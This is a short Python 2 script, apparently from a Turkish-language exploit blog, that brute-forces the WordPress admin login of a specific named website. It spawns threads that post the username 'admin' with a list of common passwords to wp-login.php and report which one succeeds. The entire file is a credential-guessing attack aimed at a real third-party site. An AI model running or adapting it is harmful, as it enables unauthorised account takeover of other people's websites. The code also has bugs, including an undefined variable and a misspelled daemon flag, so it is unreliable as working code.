import urllib
import urllib2
import re
import cookielib
import sys
import Queue
import threading
import time
                                        #http://exploitpy.wordpress.com
                                        #http://fb.com/coder.py
class calistir(threading.Thread):
        def __init__(self,user,pwd,):
                threading.Thread.__init__(self)
                self.user = user
                self.pwd = pwd
        def run(self):
                 
                yonlendir = urllib2.build_opener(urllib2.HTTPSHandler(),urllib2.HTTPHandler()) 
                print ("Brute Force Baþlýyor : "+unix)
                sex = {'log':"admin",
                'pwd':self.pwd,'redirect_to':'',
                'testcookie':'1',
                'wp-submit':'Log In'
                }
                x = time.time()
                sifrele= urllib.urlencode(sex)
                root = yonlendir.open(unix, sifrele).read()
                if "error" in root:
                        print "Deneme Basarýsýz :"+self.pwd+"\n".replace("\n","")
                         
                else:
                        print ("[*]Deneme Basarýlý :"+url+" Sifre:"+self.pwd+"\n")
                        print time.time()- x ,"Finish"
unix = "http://www.tekseninle.com/wp-login.php"
sifre=["1234","1213123","umut","cem","root","toor","roottoor","startx","passwd","password"]
for pwd in sifre:
        q = Queue.Queue()
        thread = calistir(q,pwd)
        thread.deamon = True
        thread.start()
